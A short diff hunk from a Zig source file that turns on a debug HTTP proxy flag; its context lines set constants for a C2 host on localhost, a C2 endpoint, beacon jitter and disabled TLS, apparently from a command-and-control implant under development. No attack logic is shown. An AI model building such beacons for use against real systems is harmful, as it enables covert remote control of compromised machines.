@@ -6,7 +6,7 @@ pub const std_options = struct {
     pub const http_disable_tls = true;
     pub const log_level = .info;
 };
-const enable_debug_http_proxy = false;
+const enable_debug_http_proxy = true;
 const c2_host = "127.0.0.1:8000";
 const c2_endpoint = "/endpoint";
 const jitter = 3;
